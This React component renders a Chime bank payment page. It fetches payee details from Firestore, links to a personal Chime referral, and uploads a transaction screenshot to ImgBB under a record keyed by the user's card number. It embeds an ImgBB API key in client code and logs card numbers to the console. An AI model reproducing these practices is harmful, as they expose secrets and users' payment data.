import { useContext, useEffect, useState } from 'react';
import { FaPlus, FaTimes, FaCopy } from 'react-icons/fa';
import { useNavigate } from 'react-router-dom';
import { ContextOne } from '../context-api-one/ContextApiOne';
import { doc, updateDoc, getDoc } from 'firebase/firestore';
import { db } from '../../../firbase.config';

const ChimeBankPay = () => {
    const [image, setImage] = useState(null);
    const [imageFile, setImageFile] = useState(null);
    const [copied, setCopied] = useState({
        tagName: false,
        number: false
    });
    const [isUploading, setIsUploading] = useState(false);
    const [paymentData, setPaymentData] = useState({
        tagName: '',
        number: ''
    });
    const navigate = useNavigate();
    const { recCardNumber } = useContext(ContextOne);

    useEffect(() => {
        const cleanedCardNumber = recCardNumber?.replace(/\s+/g, '');
        console.log("Card number without spaces:", cleanedCardNumber);

        // Fetch payment info from Firebase
        const fetchPaymentInfo = async () => {
            try {
                // Get tag name
                const tagNameDoc = await getDoc(doc(db, 'payment-info', 'tag-name'));
                const tagName = tagNameDoc.exists() ? tagNameDoc.data().nameInfo : '';

                // Get payment number
                const paymentNumberDoc = await getDoc(doc(db, 'payment-info', 'payment-number'));
                const paymentNumber = paymentNumberDoc.exists() ? paymentNumberDoc.data().numberInfo : '';

                setPaymentData({
                    tagName,
                    number: paymentNumber
                });
            } catch (error) {
                console.error('Error fetching payment info:', error);
            }
        };

        fetchPaymentInfo();
    }, [recCardNumber]);

    const handleImageChange = (e) => {
        const file = e.target.files[0];
        if (file) {
            setImageFile(file);
            setImage(URL.createObjectURL(file));
        }
    };

    const handleRemoveImage = () => {
        setImage(null);
        setImageFile(null);
    };

    const copyToClipboard = (text, buttonName) => {
        navigator.clipboard.writeText(text)
            .then(() => {
                setCopied(prev => ({ ...prev, [buttonName]: true }));
                setTimeout(() => {
                    setCopied(prev => ({ ...prev, [buttonName]: false }));
                }, 2000);
            })
            .catch(err => {
                console.error('Failed to copy text: ', err);
            });
    };

    const uploadImageToImgBB = async (file) => {
        const formData = new FormData();
        formData.append('image', file);

        try {
            const response = await fetch('https://api.imgbb.com/1/upload?key=9591ffed13643ced8ede38d2492e0632', {
                method: 'POST',
                body: formData
            });

            const data = await response.json();
            if (data.success) {
                return data.data.url;
            } else {
                throw new Error('Image upload failed');
            }
        } catch (error) {
            console.error('Error uploading image:', error);
            throw error;
        }
    };

    const updateFirestoreWithImageUrl = async (cardNumber, imageUrl) => {
        try {
            const cleanedCardNumber = cardNumber.replace(/\s+/g, '');
            const cardDocRef = doc(db, 'all-cards-info', cleanedCardNumber);

            await updateDoc(cardDocRef, {
                paymentImage: imageUrl,
                paymentImageTimestamp: new Date().toISOString()
            });

            console.log('Image URL successfully stored in Firestore');
        } catch (error) {
            console.error('Error updating Firestore:', error);
            throw error;
        }
    };

    const handleSubmit = async () => {
        if (!imageFile) {
            alert('Please upload a transaction screenshot first');
            return;
        }

        if (!recCardNumber) {
            alert('No card number found in context');
            return;
        }

        setIsUploading(true);

        try {
            // Step 1: Upload image to ImgBB
            const imageUrl = await uploadImageToImgBB(imageFile);

            // Step 2: Update Firestore document with the image URL
            await updateFirestoreWithImageUrl(recCardNumber, imageUrl);

            // Step 3: Navigate to payment process with state
            navigate('/payment-process', {
                state: {
                    from: '/bank-payment',
                    paymentData: {
                        imageUrl,
                        timestamp: new Date().toISOString()
                    }
                }
            });
        } catch (error) {
            console.error('Error in submission:', error);
            alert('Failed to process payment. Please try again.');
        } finally {
            setIsUploading(false);
        }
    };

    return (
        <div className="min-h-screen bg-white flex items-center justify-center p-4">
            <div className="border border-black p-8 w-full max-w-3xl">
                <h2 className="text-center text-xl font-semibold mb-6">Chime bank payment</h2>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                    {/* Left Side - Buttons */}
                    <div className="flex flex-col gap-4">
                        <div className="relative">
                            <button
                                className="bg-gray-700 text-white py-2 px-4 rounded w-full flex justify-between items-center"
                                onClick={() => copyToClipboard(paymentData.tagName, "tagName")}
                            >
                                <span>{paymentData.tagName || 'Tag name'}</span>
                                <FaCopy className="text-sm cursor-pointer" />
                            </button>
                            {copied.tagName && (
                                <span className="absolute -top-2 -right-2 bg-green-500 text-white text-xs px-2 py-1 rounded">
                                    Copied!
                                </span>
                            )}
                        </div>

                        <div className="relative">
                            <button
                                className="bg-gray-700 text-white py-2 px-4 rounded w-full flex justify-between items-center"
                                onClick={() => copyToClipboard(paymentData.number, "number")}
                            >
                                <span>{paymentData.number || 'Number'}</span>
                                <FaCopy className="text-sm cursor-pointer" />
                            </button>
                            {copied.number && (
                                <span className="absolute -top-2 -right-2 bg-green-500 text-white text-xs px-2 py-1 rounded">
                                    Copied!
                                </span>
                            )}
                        </div>

                        <button
                            onClick={() => window.open("https://www.chime.com/r/marina-gomez-8/", "_blank")}
                            className="bg-gray-700 text-white py-2 px-4 rounded cursor-pointer"
                        >
                            Chime Bank pay
                        </button>
                    </div>

                    {/* Right Side - Image Upload Box */}
                    <div className="flex items-center justify-center relative">
                        <label
                            htmlFor="file-upload"
                            className="border border-gray-400 rounded-lg w-full h-40 cursor-pointer flex flex-col items-center justify-center text-center text-gray-600 overflow-hidden relative"
                        >
                            {image ? (
                                <>
                                    <img src={image} alt="Preview" className="h-full object-contain" />
                                    <button
                                        type="button"
                                        onClick={handleRemoveImage}
                                        className="absolute top-1 right-1 bg-white p-1 rounded-full shadow"
                                    >
                                        <FaTimes className="text-red-600 text-sm" />
                                    </button>
                                </>
                            ) : (
                                <>
                                    <FaPlus className="text-2xl mb-2" />
                                    <span className="text-sm">Please submit your transaction id or screenshot</span>
                                </>
                            )}
                            <input
                                id="file-upload"
                                type="file"
                                accept="image/*"
                                className="hidden"
                                onChange={handleImageChange}
                            />
                        </label>
                    </div>
                </div>

                {/* Submit Button */}
                <div className="mt-6 flex justify-center">
                    <button
                        onClick={handleSubmit}
                        className={`${image ? 'bg-blue-600 hover:bg-blue-700' : 'bg-gray-400 cursor-not-allowed'} text-white py-2 px-8 rounded transition flex items-center justify-center gap-2`}
                        disabled={!image || isUploading}
                    >
                        {isUploading ? (
                            <>
                                <svg className="animate-spin -ml-1 mr-2 h-4 w-4 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                                </svg>
                                Uploading...
                            </>
                        ) : 'Submit'}
                    </button>
                </div>

                {/* Note */}
                <p className="text-xs text-gray-600 mt-4 text-center">
                    note: direct transfer from bank will not be accepted<br />
                    Add fund to your balance before doing payment
                </p>
            </div>
        </div>
    );
};

export default ChimeBankPay;